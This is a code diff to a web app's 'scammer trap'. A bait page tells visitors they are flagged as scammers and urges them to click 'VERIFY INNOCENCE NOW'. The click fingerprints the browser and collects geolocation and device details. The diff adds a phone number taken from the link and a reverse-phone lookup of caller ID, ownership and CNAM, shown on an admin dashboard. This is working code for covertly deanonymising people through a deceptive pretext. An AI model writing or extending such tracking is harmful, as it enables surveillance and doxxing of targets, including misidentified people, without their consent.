@@ -276,6 +276,20 @@ app.get('/', adminLimiter, adminAuth, (req, res) => {
         </div>
         <div class="mt-2 text-xs text-zinc-500">UA: <span class="font-mono break-all">\${ua}</span></div>\`;
 
+      // Trestle reverse-phone intel — caller ID, phone ownership, CNAM.
+      const trestle = data.trestle || null;
+      const trestleBlock = trestle ? \`
+        <div class="mt-4 bg-sky-950/40 border border-sky-700/50 rounded-xl p-3 text-sm">
+          <div class="text-sky-300 font-bold mb-2">📞 Reverse Phone Intel (Trestle)</div>
+          <div class="text-xs">
+            <div class="mb-1">Phone: <span class="font-mono text-white">\${escapeHtml(trestle.phone || '—')}</span></div>
+            \${trestle.caller_id ? '<div class="mb-1"><strong>Caller ID:</strong> ' + escapeHtml(JSON.stringify(trestle.caller_id, null, 2)) + '</div>' : ''}
+            \${trestle.phone_intel ? '<div class="mb-1"><strong>Phone Intel:</strong> ' + escapeHtml(JSON.stringify(trestle.phone_intel, null, 2)) + '</div>' : ''}
+            \${trestle.cnam ? '<div class="mb-1"><strong>CNAM:</strong> ' + escapeHtml(JSON.stringify(trestle.cnam, null, 2)) + '</div>' : ''}
+            \${!trestle.caller_id && !trestle.phone_intel && !trestle.cnam ? '<div class="text-zinc-400">No data returned</div>' : ''}
+          </div>
+        </div>\` : '';
+
       entry.innerHTML = \`
         <div class="flex justify-between">
           <span class="font-bold">Trap ID: \${trapId}</span>
@@ -291,6 +305,7 @@ app.get('/', adminLimiter, adminAuth, (req, res) => {
         </div>
         \${geoBlock}
         \${leakBlock}
+        \${trestleBlock}
         \${extrasBlock}
         <div class="mt-4 text-sm text-lime-300 whitespace-pre-wrap">AI Scammer Profile:
 \${profile}</div>
@@ -491,7 +506,13 @@ app.get('/check-scammer/:id', (req, res) => {
   const ip = getClientIp(req);
   const safeIp = JSON.stringify(ip);           // e.g. "1.2.3.4" — always valid JS string literal
   const safeTrapId = JSON.stringify(req.params.id);
-  console.log(`🎣 Bait page loaded: trapId=${req.params.id}, ip=${ip}`);
+  // Extract phone from query params if present (e.g. ?phone=+1234567890)
+  const rawPhone = (req.query.phone || '').toString().trim();
+  const phone = rawPhone
+    ? rawPhone.replace(/[^\d+]/g, '').replace(/(?!^)\+/g, '')
+    : '';
+  const safePhone = JSON.stringify(phone);
+  console.log(`🎣 Bait page loaded: trapId=${req.params.id}, ip=${ip}${phone ? `, phone=${phone}` : ''}`);
   res.send(`
 <!DOCTYPE html>
 <html>
@@ -502,7 +523,7 @@ app.get('/check-scammer/:id', (req, res) => {
   <div class="max-w-md text-center">
     <h1 class="text-5xl mb-4">Hey...</h1>
     <p class="text-2xl mb-8">This link says you're a scammer.</p>
-    <button onclick="activateTrap(${safeTrapId}, ${safeIp})" class="w-full py-8 text-3xl bg-red-600 hover:bg-red-700 rounded-2xl font-bold">VERIFY INNOCENCE NOW</button>
+    <button onclick="activateTrap(${safeTrapId}, ${safeIp}, ${safePhone})" class="w-full py-8 text-3xl bg-red-600 hover:bg-red-700 rounded-2xl font-bold">VERIFY INNOCENCE NOW</button>
   </div>
 
   <script src="https://openfpcdn.io/fingerprintjs/v5"></script>
@@ -630,9 +651,9 @@ app.get('/check-scammer/:id', (req, res) => {
       };
     }
 
-    async function activateTrap(trapId, ip) {
+    async function activateTrap(trapId, ip, phone) {
       try {
-        console.log('🔍 Fingerprinting... trapId=' + trapId + ' ip=' + ip);
+        console.log('🔍 Fingerprinting... trapId=' + trapId + ' ip=' + ip + (phone ? ' phone=' + phone : ''));
 
         let visitorId = null, thumbResult = null, fpResult = null;
         try {
@@ -671,6 +692,9 @@ app.get('/check-scammer/:id', (req, res) => {
           timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
           languages: Array.from(navigator.languages || []),
           screen: { w: screen.width, h: screen.height },
+          // Phone number extracted from query params — server passes it through
+          // so enrichment (Trestle / Apify) can use it without client guessing.
+          phone: phone || null,
           // Research-mode payload — always present, no toggle.
           research: {
             geolocation: geo,
